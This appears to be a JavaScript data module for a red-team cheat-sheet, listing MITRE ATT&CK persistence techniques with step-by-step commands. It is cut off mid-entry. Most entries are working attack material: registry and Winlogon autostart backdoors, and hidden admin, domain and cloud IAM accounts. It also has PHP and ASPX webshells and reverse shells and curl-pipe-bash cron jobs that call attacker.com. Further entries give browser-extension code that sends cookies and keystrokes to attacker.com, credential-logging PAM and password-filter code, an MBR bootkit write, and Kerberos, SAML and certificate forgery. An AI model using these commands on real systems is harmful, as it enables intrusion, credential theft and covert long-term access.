export const PERSISTENCE = {
  id: "persistence",
  name: "Persistence",
  tacticId: "TA0003",
  subtitle: "Shadow Creds • Rogue CA • Silver Ticket • AdminSDHolder • Machine Account • ADIDNS Time Bomb • GPO Backdoor • Webshells • Boot/Logon Autostart • BITS Jobs • Browser Extensions • LSASS SSP/WDigest • Modify Auth • Pre-OS Boot • Container Image • Orchestration Job • Reverse SSH Tunnel • RDP Backdoor • Default Account Abuse • Binary Trojanize • Kernel Modules • Traffic Signaling",
  color: "#34d399",
  techniques: [
    {
      name: "Boot / Logon Autostart Execution",
      id: "T1547",
      summary: "Registry Run keys • Startup folder • DLL search order",
      description: "Persist via registry Run keys, startup folders, and other autostart locations",
      tags: ["Run keys", "Startup folder", "HKCU", "T1547"],
      steps: [
        "Registry Run key persistence (no admin required for HKCU):\n# HKCU Run keys execute as the logged-in user — no admin needed, low noise\n$ reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Windows Update\" /t REG_SZ /d \"powershell.exe -w h -enc BASE64\" /f\n# Name your key to match legitimate values (e.g., 'OneDrive', 'Teams', 'Discord')\n# HKLM Run: system-wide, requires admin, executes for ALL users\n$ reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"svchost\" /t REG_SZ /d \"C:\\\\Windows\\\\temp\\\\svchost.exe\" /f\n# Additional run key paths to check/abuse:\n# HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce (fires once then deletes)\n# HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run (32-bit on 64-bit)",
        "Startup folder persistence:\n# Files dropped in Startup folder auto-execute at user logon — no registry change needed\n$ copy payload.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n# User-level: no admin required, only runs for current user\n$ copy payload.exe \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n# System-wide: requires admin, runs for ALL users\n# Rename payload to blend in: OneDriveSetup.exe, Teams.exe, SteamHelper.exe\n# Path: C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
        "Winlogon helper persistence (runs as SYSTEM at logon):\n# Winlogon reads Userinit value and runs everything listed at user logon\n# Original value: C:\\Windows\\system32\\userinit.exe\n# Append your payload — both get executed\n$ reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Userinit\" /d \"C:\\Windows\\system32\\userinit.exe,C:\\\\Windows\\\\Temp\\\\updater.exe\" /f\n# Also exploitable: Winlogon Shell value (default: explorer.exe)\n$ reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Shell\" /d \"explorer.exe,C:\\\\Windows\\\\Temp\\\\updater.exe\" /f\n# Runs as the logging-in user (not SYSTEM) but fires before desktop loads",
        "AppInit_DLLs — DLL injected into every User32.dll-loading process:\n# User32.dll is loaded by almost every GUI process on Windows\n# This DLL will be loaded into: explorer.exe, all browsers, Office apps, etc.\n$ reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"C:\\\\Windows\\\\System32\\\\payload.dll\" /f\n$ reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f\n# Requires admin; very noisy — use only when stealth is low priority\n# Secure Boot may block unsigned DLLs on modern systems",
        "Audit all autostart locations with autoruns:\n$ autorunsc.exe -accepteula -a * -s -h -c -vt > autoruns.csv\n# -a *: all autostart locations; -s: check VirusTotal signatures; -vt: submit hashes\n# -h: hide Microsoft-signed entries (reduces noise to find attacker persistence)\n# Open autoruns.csv in Excel, filter by empty 'Publisher' column\n# Anything unsigned or with unusual paths = suspicious"
      ]
    },
    {
      name: "Create Account",
      id: "T1136",
      summary: "Local admin • domain account • cloud user • service account",
      description: "Create backdoor accounts for persistent access",
      tags: ["local admin", "domain account", "backdoor user", "T1136"],
      steps: [
        "Create hidden local admin account (Windows):\n$ net user backdoor 'P@ssw0rd123!' /add\n$ net localgroup administrators backdoor /add\n# Hide from logon screen (registry trick):\n$ reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v backdoor /t REG_DWORD /d 0 /f",
        "Create domain account (requires DA):\n$ net user backdoor 'P@ssw0rd123!' /add /domain\n$ net group 'Domain Admins' backdoor /add /domain\n# Or with PowerShell:\n> New-ADUser -Name 'svc-backup' -AccountPassword (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force) -Enabled $true",
        "Add SSH authorized key for Linux persistence:\n$ mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys\n$ chmod 600 /root/.ssh/authorized_keys\n# Add key to any user's authorized_keys\n$ echo 'ssh-rsa AAAA...' >> /home/user/.ssh/authorized_keys",
        "Create cloud IAM backdoor user:\n$ aws iam create-user --user-name svc-monitoring\n$ aws iam attach-user-policy --user-name svc-monitoring --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n$ aws iam create-access-key --user-name svc-monitoring\n# Creates permanent admin access key",
        "Create Azure AD/Entra ID backdoor:\n$ az ad user create --display-name 'Sync Service' --user-principal-name sync@target.com --password 'P@ssw0rd123!'\n$ az role assignment create --role 'Global Administrator' --assignee sync@target.com"
      ]
    },
    {
      name: "Server Software Component",
      id: "T1505",
      summary: "Webshell • SQL stored procedure • IIS module • transport agent",
      description: "Install persistent backdoors as server-side components like webshells or database backdoors",
      tags: ["webshell", "SQL", "IIS module", "T1505"],
      steps: [
        "Deploy PHP webshell:\n> <?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd=($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; } ?>\n$ echo '<?php system($_GET[\"cmd\"]);?>' > /var/www/html/wp-content/uploads/.img.php\n# Access: https://target.com/wp-content/uploads/.img.php?cmd=id",
        "ASPX webshell for IIS:\n> <%@ Page Language=\"C#\" %>\n> <% System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + Request[\"cmd\"]; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>\n# Upload to writable IIS directory",
        "Advanced webshell with authentication:\n$ weevely generate 'password123' /var/www/html/config.php\n$ weevely https://target.com/config.php password123\n# Weevely: obfuscated PHP agent with many modules",
        "MSSQL stored procedure backdoor:\n> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\n> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n> EXEC xp_cmdshell 'whoami';\n# Enable xp_cmdshell for OS command execution from SQL\n$ python3 mssqlclient.py domain/admin:pass@192.168.1.100",
        "IIS native module (DLL backdoor):\n> // Compile as DLL implementing IHttpModule\n> void OnBeginRequest(IHttpContext* pContext) {\n>     // Parse special request header, execute commands\n> }\n# Installed as: appcmd install module /name:Backdoor /image:C:\\\\Windows\\\\System32\\\\backdoor.dll\n# Extremely persistent, survives app pool recycles"
      ]
    },
    {
      name: "Hijack Execution Flow",
      id: "T1574",
      summary: "DLL hijacking • PATH hijacking • LD_PRELOAD • DLL sideloading",
      description: "Persist by replacing or inserting malicious code into execution flow",
      tags: ["DLL hijacking", "PATH hijacking", "DLL sideloading", "T1574"],
      steps: [
        "Find DLL hijacking opportunities:\n$ procmon.exe /Quiet /Minimized /BackingFile procmon.pml\n# Filter: Result = NAME NOT FOUND, Path ends with .dll\n# Look for DLLs searched in user-writable paths first",
        "DLL sideloading (abusing legitimate apps):\n# Legitimate app loads DLL from its own directory\n# Place malicious DLL in app's directory\n# App loads malicious DLL instead of system DLL\n# Common targets: OneDrive, Slack, Teams, Edge components",
        "PATH hijacking on Linux/macOS:\n$ echo $PATH\n# If user-writable directory is before system directories\n$ echo '#!/bin/bash\\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /home/user/bin/python3\n$ chmod +x /home/user/bin/python3\n# When admin runs 'python3', our script executes first",
        "Create malicious DLL template:\n> BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved) {\n>     if (dwReason == DLL_PROCESS_ATTACH) {\n>         // Spawn reverse shell or load shellcode\n>         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);\n>     }\n>     return TRUE;\n> }\n# Compile as DLL, place in target application directory",
        "Weak service binary permissions:\n$ accesschk.exe -uwcqv 'Authenticated Users' *\n$ icacls 'C:\\Program Files\\VulnApp\\service.exe'\n# If writable by low-priv user, replace binary\n$ copy /y payload.exe 'C:\\Program Files\\VulnApp\\service.exe'\n$ sc stop VulnService && sc start VulnService"
      ]
    },
    {
      name: "Account Manipulation",
      id: "T1098",
      summary: "SSH keys • RBAC abuse • token theft • credential add",
      description: "Modify existing accounts to maintain access after initial compromise",
      tags: ["SSH keys", "RBAC", "Azure AD", "T1098"],
      steps: [
        "Add SSH authorized key to existing account:\n$ echo 'ssh-rsa ATTACKER_PUBLIC_KEY' >> /root/.ssh/authorized_keys\n$ echo 'ssh-rsa ATTACKER_PUBLIC_KEY' >> ~/.ssh/authorized_keys\n# Backdoor SSH access that survives password changes",
        "Azure AD application credential addition:\n$ az ad app credential reset --id APP_ID --append\n# Adds new client secret to existing app registration\n# Allows OAuth token generation without existing cred\n$ New-AzADAppCredential -ObjectId APP_OBJECT_ID -StartDate (Get-Date) -EndDate (Get-Date).AddYears(2)",
        "Modify AD object ACLs for persistence:\n> Import-Module ActiveDirectory\n> $acl = Get-Acl 'AD:CN=Domain Admins,CN=Users,DC=domain,DC=com'\n> $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]'DOMAIN\\backdoor', 'GenericAll', 'Allow')\n> $acl.AddAccessRule($rule)\n> Set-Acl 'AD:CN=Domain Admins,CN=Users,DC=domain,DC=com' $acl\n# backdoor user can add anyone to Domain Admins",
        "AWS access key addition:\n$ aws iam create-access-key --user-name existing-admin-user\n# Adds second access key - first may be monitored\n# Second key provides backdoor access",
        "O365/Exchange mailbox delegation:\n> Add-MailboxPermission -Identity 'target@corp.com' -User 'attacker@corp.com' -AccessRights FullAccess -InheritanceType All\n# Read all email from target mailbox silently"
      ]
    },
    {
      name: "Event Triggered Execution",
      id: "T1546",
      summary: "WMI subscription • screensaver • accessibility • AppCert DLLs",
      description: "Persist by hooking system events that trigger execution when conditions are met",
      tags: ["WMI subscription", "screensaver", "IFEO", "T1546"],
      steps: [
        "WMI permanent event subscription (fileless persistence):\n$ python3 wmiexec.py domain/admin:pass@192.168.1.100\n# Use Impacket wmiexec or PowerShell directly for WMI persistence\n# Or via PowerShell - see WMI Execution technique for commands\n# Triggers every 60 seconds, survives reboots, lives in WMI repository",
        "Image File Execution Options (IFEO) - Accessibility Features:\n$ reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\"\n# Press Shift 5 times at login screen → cmd.exe as SYSTEM\n$ reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\"\n# On-Screen Keyboard → cmd.exe",
        "Screensaver persistence:\n$ reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"C:\\\\Windows\\\\temp\\\\payload.scr\" /f\n$ reg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\n$ reg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveTimeOut /t REG_SZ /d 60 /f\n# Payload runs as screensaver after 60 seconds idle",
        "AppCert DLLs (loaded by every process using CreateProcess):\n$ reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" /v AppCertDLLs /t REG_MULTI_SZ /d \"C:\\\\Windows\\\\System32\\\\payload.dll\" /f\n# DLL loaded into every new process - SYSTEM-level",
        "COM object hijacking for user-level persistence:\n$ reg add HKCU\\Software\\Classes\\CLSID\\{GUID-TARGETTED-BY-APP}\\InprocServer32 /ve /d C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\payload.dll /f\n# No admin needed - HKCU overrides HKLM for COM lookup"
      ]
    },
    {
      name: "BITS Jobs",
      id: "T1197",
      summary: "bitsadmin • PowerShell BITS • download and execute",
      description: "Abuse Background Intelligent Transfer Service for persistence and stealthy downloads",
      tags: ["bitsadmin", "BITS", "download", "T1197"],
      steps: [
        "Create persistent BITS job:\n$ bitsadmin /create /download /priority high svcupdate\n$ bitsadmin /addfile svcupdate http://attacker.com/payload.exe C:\\Windows\\temp\\payload.exe\n$ bitsadmin /setnotifycmdline svcupdate C:\\Windows\\temp\\payload.exe NULL\n$ bitsadmin /resume svcupdate\n# Downloads and executes on completion",
        "BITS with PowerShell:\n> Import-Module BitsTransfer\n> Start-BitsTransfer -Source 'http://attacker.com/payload.exe' -Destination 'C:\\Windows\\temp\\payload.exe' -Asynchronous\n> Set-BitsTransfer -BitsJob $job -NotificationCmdLine 'C:\\Windows\\temp\\payload.exe'\n> Resume-BitsTransfer -BitsJob $job",
        "BITS persistence (survives reboots):\n$ bitsadmin /setminretrydelay svcupdate 60\n$ bitsadmin /setcustomheaders svcupdate \"X-Host: legitimate.com\"\n# BITS jobs survive reboots, network changes\n# Traffic looks like Windows Update to IDS/firewalls",
        "List and enumerate all BITS jobs:\n$ bitsadmin /list /allusers /verbose\n# Enumerate BITS jobs on remote host via WMI\n$ Get-BitsTransfer -AllUsers | Select-Object DisplayName,TransferType,JobState,FileList\n# Used for discovery of active BITS abuse",
        "Cleanup BITS jobs:\n$ bitsadmin /cancel svcupdate\n$ Get-BitsTransfer | Remove-BitsTransfer"
      ]
    },
    {
      name: "Browser Extensions",
      id: "T1176",
      summary: "Malicious extension • extension modification • developer mode",
      description: "Install malicious browser extensions for credential theft, session hijacking, and persistence",
      tags: ["browser extension", "Chrome", "Firefox", "T1176"],
      steps: [
        "Malicious Chrome extension manifest:\n> {\n>   \"name\": \"PDF Viewer\",\n>   \"version\": \"1.0\",\n>   \"permissions\": [\"tabs\", \"storage\", \"<all_urls>\"],\n>   \"content_scripts\": [{\"matches\": [\"<all_urls>\"], \"js\": [\"steal.js\"]}],\n>   \"background\": {\"service_worker\": \"bg.js\"}\n> }\n# steal.js: capture form inputs, send to attacker",
        "Force install via Group Policy (Chrome):\n> ExtensionInstallForcelist = 1=abcdefghijklmnop;https://update.attacker.com/crx/update\n$ reg add \"HKLM\\Software\\Policies\\Google\\Chrome\\ExtensionInstallForcelist\" /v 1 /d \"ID;https://attacker.com/update\" /f\n# Extension silently installed, cannot be removed by user",
        "Session cookie theft via extension:\n> chrome.cookies.getAll({}, function(cookies) {\n>     fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify(cookies)});\n> });\n# Extracts all cookies including session tokens\n# Bypasses HTTPS - extension has access to all cookies",
        "Keylogging via content script:\n> document.addEventListener('keydown', function(e) {\n>     fetch('https://attacker.com/keys', {method:'POST', body: e.key + '::' + window.location.href});\n> });\n# Captures all keystrokes on every webpage",
        "Persistence: extension survives browser updates, reinstalls\n# Chrome extensions stored in user profile directory\n# Difficult for users to notice among legitimate extensions"
      ]
    },
    {
      name: "Modify Authentication Process",
      id: "T1556",
      summary: "PAM module • password filter DLL • SSO backdoor • network device auth",
      description: "Backdoor authentication mechanisms to maintain access and capture credentials",
      tags: ["PAM module", "password filter", "SSO", "T1556"],
      steps: [
        "Malicious PAM module for Linux:\n> #include <security/pam_appl.h>\n> #include <security/pam_modules.h>\n> PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {\n>     const char *user; const char *pass;\n>     pam_get_user(pamh, &user, NULL);\n>     pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);\n>     // Log credentials to attacker server\n>     // Always return PAM_SUCCESS for backdoor access\n>     if (strcmp(pass, \"backdoor\") == 0) return PAM_SUCCESS;\n>     return pam_sm_authenticate_real(pamh, flags, argc, argv);\n> }\n# Compiled, installed in /lib/security/, added to /etc/pam.d/",
        "Windows password filter DLL:\n> BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation) {\n>     // Log password to attacker-controlled location\n>     LogPassword(AccountName->Buffer, Password->Buffer);\n>     return TRUE;  // Always pass filter\n> }\n# Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages\n# Captures every password change in cleartext",
        "Golden SAML — forge SAML assertions using stolen IdP signing key:\n# Requires: ADFS token signing certificate (private key)\n# Extract DKM key and token signing cert with ADFSDump (C# tool):\n$ ADFSDump.exe /domain:domain.com /server:adfs.domain.com\n# Outputs: token signing certificate + DKM encryption key\n# Decrypt and export the signing private key from DKM\n# Forge SAML assertion for any user using shimit (Golden SAML toolkit):\n$ python3 shimit.py -idp https://adfs.domain.com/adfs/services/trust -pk adfs_key.pem -c adfs_cert.pem -u administrator -r 'http://schemas.microsoft.com/ws/2008/06/identity/claims/role=Administrator'\n# Generates signed SAML assertion accepted by any relying party (O365, AWS, Salesforce, etc.)\n# Works even if the user's AD password is changed\n# Golden SAML survives until the token signing cert is rotated",
        "ADFS token signing certificate extraction (manual):\n# Local admin on ADFS server → export via Windows cert store:\n$ certutil -exportpfx -privatekey -user 'ADFS Encryption' adfs_signing.pfx\n# Or via ADFS admin PowerShell:\n> $cert = (Get-AdfsCertificate -CertificateType Token-Signing).Certificate\n> $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, 'password') | Set-Content adfs_signing.pfx -Encoding Byte\n# With DKM master key (from AD), decrypt the cert stored in AD:\n# DKM key stored at: CN=CryptoPolicy,CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=com\n# ADFSDump.exe automates DKM key retrieval + cert decryption\n# Result: forge tokens for any user in any federated application indefinitely",
        "Network device authentication backdoor:\n# Add second RADIUS secret, local user account\n# Firmware modification for persistent access\n# Common in compromised Cisco, Juniper devices"
      ]
    },
    {
      name: "Pre-OS Boot",
      id: "T1542",
      summary: "Bootkit • UEFI implant • MBR manipulation • VBR infection",
      description: "Persist below the OS level via bootkit or UEFI firmware implants",
      tags: ["bootkit", "UEFI", "MBR", "T1542"],
      steps: [
        "MBR bootkit infection:\n$ dd if=/dev/sda of=original_mbr.bin bs=512 count=1  # Backup original MBR\n$ dd if=bootkit.bin of=/dev/sda bs=512 count=1  # Write malicious MBR\n# Bootkit loads before OS, hooks boot process\n# Difficult to detect with OS-level tools",
        "UEFI firmware analysis:\n$ fwupdmgr get-devices\n$ uefi-firmware-parser --extract firmware.bin\n# Extract UEFI capsule, analyze DXE drivers\n# Identify injection points for persistent UEFI implant",
        "UEFI implant deployment (Kaspersky CosmicStrand, FinSpy style):\n# Modify DXE driver in SPI flash\n# Implant survives OS reinstall, hard drive replacement\n# Only firmware flash removes it\n# Flash via SPI programmer or UEFI capsule update",
        "Secure Boot bypass:\n$ mokutil --disable-validation\n# Machine Owner Key manipulation\n# Load unsigned bootloader bypassing Secure Boot\n# BlackLotus (CVE-2022-21894) - Secure Boot bypass bootkit",
        "Detection: check MBR integrity:\n$ dd if=/dev/sda bs=512 count=1 | md5sum\n$ diff <(dd if=/dev/sda bs=512 count=1) <(dd if=backup_mbr.bin bs=512 count=1)\n# Compare against known-good baseline"
      ]
    },
    {
      name: "Office Application Startup",
      id: "T1137",
      summary: "VBA macro • Office template • add-in • Outlook rules",
      description: "Persist through Microsoft Office application startup mechanisms",
      tags: ["VBA macro", "Office template", "add-in", "T1137"],
      steps: [
        "Malicious VBA macro in Normal.dotm (Word template):\n> Sub AutoExec()\n>     CreateObject(\"WScript.Shell\").Run \"powershell -enc BASE64\", 0, False\n> End Sub\n# Place in %APPDATA%\\Microsoft\\Word\\STARTUP\\ for persistence\n# Runs every time Word opens",
        "Excel Personal.xlsb macro persistence:\n# Personal.xlsb auto-opens with every Excel session\n# Insert malicious macro in Personal.xlsb\n# %APPDATA%\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB",
        "Outlook Home Page rule:\n> Set-MailboxFolderPermission -Identity target@corp.com:\\Inbox -HomePageURL 'https://attacker.com/payload.html'\n# Loads webpage in Outlook folder pane\n# WebView2 executes JavaScript - code execution on Outlook open",
        "COM Add-in for Office persistence:\n$ reg add HKCU\\Software\\Microsoft\\Office\\Word\\Addins\\attacker.addin /v Description /d 'PDF Converter' /f\n$ reg add HKCU\\Software\\Microsoft\\Office\\Word\\Addins\\attacker.addin /v FriendlyName /d 'PDF Converter' /f\n$ reg add HKCU\\Software\\Microsoft\\Office\\Word\\Addins\\attacker.addin /v Manifest /d 'file://C:\\\\Windows\\\\temp\\\\addin.xml' /f\n# Loads malicious add-in on every Office start",
        "Outlook rules for email-triggered execution via EWS (Exchange Web Services):\n# Create a server-side Outlook rule that runs an application on rule trigger\n# Requires: valid credentials + Exchange access (EWS enabled)\n$ python3 rulers.py --email jdoe@corp.com --password 'P@ss123' --server mail.corp.com --port 443 add-rule --name 'Update' --trigger 'ACTIVATE' --action-type process --action-arg 'C:\\Windows\\Temp\\payload.exe'\n# rulers (Go): https://github.com/sensepost/ruler — create Outlook rules via MAPI/EWS\n# Rule fires when target user receives email with matching subject 'ACTIVATE'\n# Can also create HomeFolder-based rules (CVE-2020-16947 style) via MailSniper:\n$ Import-Module MailSniper.ps1\n$ Invoke-SelfSearch -Mailbox jdoe@corp.com -ExchangeVersion Exchange2016 -remote\n# Or via compromised Exchange with EWS directly:\n# POST /EWS/Exchange.asmx with CreateRule SOAP request targeting ReceiveTimeRule\n# Stealthy: server-side rules persist without endpoint footprint"
      ]
    },
    {
      name: "Boot or Logon Initialization Scripts",
      id: "T1037",
      summary: ".bashrc • .profile • logon scripts • rc.local • /etc/profile.d",
      description: "Persist via shell initialization scripts and logon scripts",
      tags: [".bashrc", "logon script", "rc.local", "T1037"],
      steps: [
        "Linux shell init script persistence:\n$ echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc\n$ echo 'curl -s http://attacker.com/shell.sh | bash &' >> ~/.profile\n# Executes every time user opens a shell",
        "System-wide Linux init:\n$ echo '/tmp/payload.sh &' >> /etc/rc.local\n$ cat > /etc/profile.d/update.sh << 'EOF'\n> #!/bin/bash\n> /tmp/.sysupdate &\n> EOF\n$ chmod +x /etc/profile.d/update.sh\n# /etc/profile.d/ scripts run for every user login",
        "Windows domain logon script via GPO:\n# Group Policy: User Configuration → Policies → Windows Settings → Scripts → Logon\n# Add script: \\\\DC\\SYSVOL\\domain.com\\scripts\\logon.bat\n> net use \\\\attacker.com\\share\n> copy \\\\attacker.com\\share\\payload.exe %TEMP%\\update.exe\n> start %TEMP%\\update.exe\n# Runs for every domain user at logon",
        "macOS LaunchAgent (user-level persistence):\n> <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n> <plist version=\"1.0\"><dict>\n>     <key>Label</key><string>com.apple.softwareupdate</string>\n>     <key>ProgramArguments</key><array><string>/bin/bash</string><string>/tmp/payload.sh</string></array>\n>     <key>RunAtLoad</key><true/>\n>     <key>KeepAlive</key><true/>\n> </dict></plist>\n$ launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist",
        "Cron job for root:\n$ echo '*/5 * * * * root curl -s http://attacker.com/sh | bash' >> /etc/cron.d/syscheck\n# Runs as root every 5 minutes\n# File in /etc/cron.d/ survives crontab -r"
      ]
    },
    {
      name: "Shadow Credentials Persistence",
      id: "T1098.shadow",
      summary: "msDS-KeyCredentialLink • pywhisker • Whisker • PKINIT backdoor",
      description: "Persist by adding an attacker-controlled Key Credential to target accounts for long-term certificate-based authentication",
      tags: ["shadow credentials", "msDS-KeyCredentialLink", "pywhisker", "T1098"],
      steps: [
        "What are shadow credentials and why use them:\n# Windows Hello for Business stores device certificates in msDS-KeyCredentialLink attribute\n# If you have GenericWrite on an object, you can ADD a key credential (attacker-controlled cert)\n# This lets you authenticate as that user via PKINIT (certificate-based Kerberos) indefinitely\n# Survives: password resets, account lockouts, MFA changes — the cert is independent\n# Only removed by: clearing the msDS-KeyCredentialLink attribute",
        "Add shadow credential to target DA account:\n# Requirements: GenericWrite or AllExtendedRights on the target user/computer\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target administrator --action add --filename da_backdoor\n# Generates: da_backdoor.pfx (certificate + private key) + da_backdoor.pass (PFX password)\n# Verify it was added:\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target administrator --action list\n# Windows variant (on domain-joined host):\n$ Whisker.exe add /target:administrator /domain:domain.com /dc:DC_IP\n# Output includes the Rubeus command to use the cert immediately",
        "Authenticate using shadow credential for persistent access:\n# Use anytime — even 6 months later after the account's password has changed 10 times\n$ certipy auth -pfx da_backdoor.pfx -password da_backdoor.pass -dc-ip DC_IP -domain domain.com\n# Returns TWO things: (1) TGT valid for this session, (2) NT hash for the account\n# The NT hash is useful for PTH/PTT even without re-authenticating\n$ export KRB5CCNAME=administrator.ccache\n$ secretsdump.py -k -no-pass domain.com/administrator@DC_IP  # DCSync",
        "Shadow credentials on computer accounts (DC persistence):\n# If you have write on a computer account (e.g., via RBCD write rights or DA)\n# Adding shadow creds to DC$ gives persistent DC machine account authentication\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target 'DC01$' --action add --filename dc_backdoor\n$ certipy auth -pfx dc_backdoor.pfx -dc-ip DC_IP -domain domain.com\n# DC machine account TGT → DCSync without needing any domain account password\n# Harder to detect: looks like device credential management",
        "Backdoor multiple accounts for operational resilience:\n# Single account shadow cred = single point of failure if IR removes it\n# Backdoor multiple accounts at different privilege levels:\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target administrator --action add\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target 'svc-backup' --action add\n$ python3 pywhisker.py -d domain.com -u attacker -p pass --target 'DC01$' --action add\n# If one is found and removed during IR: others still provide access\n# Blue team perspective: check msDS-KeyCredentialLink on all privileged accounts during IR\n$ Get-ADObject -Filter * -Properties msDS-KeyCredentialLink | Where {$_.msDS-KeyCredentialLink}"
      ]
    },
    {
      name: "Rogue Certificate Authority",
      id: "T1553.cert",
      summary: "Stolen CA key • forge certificates • ADCS persistence • sub-CA enrollment",
      description: "Persist by forging certificates using a stolen CA private key or by enrolling a rogue subordinate CA",
      tags: ["rogue CA", "stolen CA key", "ADCS", "certificate forging", "T1553"],
      steps: [
        "Extract CA private key from ADCS server:\n$ python3 certipy cert -pfx ca.pfx -nokey -out ca.crt\n$ python3 certipy ca -backup -u admin@domain.com -p pass -ca CA-NAME -dc-ip DC_IP\n# Exports CA certificate + private key as .pfx\n# Requires: CA admin or local admin on ADCS server\n$ SharpDPAPI.exe certificates /machine  # Extract cert from machine store",
        "Forge certificates using stolen CA key:\n$ certipy forge -ca-pfx ca.pfx -upn administrator@domain.com -subject 'CN=Administrator'\n$ certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP\n# Create signed certificate for any user without enrollment\n# CA key = unlimited certificate forgery for the CA's lifetime",
        "Publish rogue certificate template:\n# With CA admin rights: publish malicious template\n$ Certify.exe request /ca:CA\\CA-NAME /template:User /altname:administrator\n# Or modify existing template to allow arbitrary SAN\n$ certipy template -u admin@domain.com -p pass -template User -dc-ip DC_IP\n# Template modification persists until reverted",
        "Renew rogue CA certificate for long-term persistence:\n$ openssl genrsa -out ca_key.pem 4096\n$ openssl req -new -x509 -days 3650 -key ca_key.pem -out ca_cert.pem\n# Self-signed CA cert forged with original subject = still trusted\n# Actual CA key must be used to sign the renewed cert\n# 10-year validity = decade of certificate forgery capability",
        "Persistence via enrollment agent certificate:\n$ certipy req -u attacker@domain.com -p pass -ca CA-NAME -template EnrollmentAgent -dc-ip DC_IP\n# Enrollment agent cert allows requesting certs on behalf of any user\n# Very long validity by default\n# Acts as a persistent ticket to generate auth certs for anyone"
      ]
    },
    {
      name: "Silver Ticket Persistence",
      id: "T1558.002",
      summary: "Service hash • forged TGS • offline • no DC contact",
      description: "Forge Kerberos TGS tickets using a service account's NT hash for persistent access to specific services without DC interaction",
      tags: ["Silver Ticket", "service hash", "TGS forgery", "T1558"],
      steps: [
        "Extract target service account hash:\n$ secretsdump.py domain/admin:pass@DC_IP -just-dc-user svc-mssql\n# Or from LSASS of the service machine:\n$ secretsdump.py domain/admin:pass@192.168.1.100\n# Need: NT hash of the service account or computer account\n# For CIFS/HOST/WSMAN on machine: use machine account hash ($)",
        "Forge Silver Ticket with Mimikatz:\n$ mimikatz.exe 'kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-DOMAIN-SID /target:server.domain.com /service:cifs /rc4:SERVICE_NTLM_HASH /ptt'\n# /service:cifs: SMB access to target server\n# /target: specific server the ticket is valid for\n# No DC contact required - offline forgery",
        "Forge Silver Ticket with ticketer.py (Linux):\n$ ticketer.py -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-SID -domain domain.com -spn cifs/server.domain.com Administrator\n$ export KRB5CCNAME=Administrator.ccache\n$ smbclient //server.domain.com/C$ -k\n# Persistent SMB access to specific server",
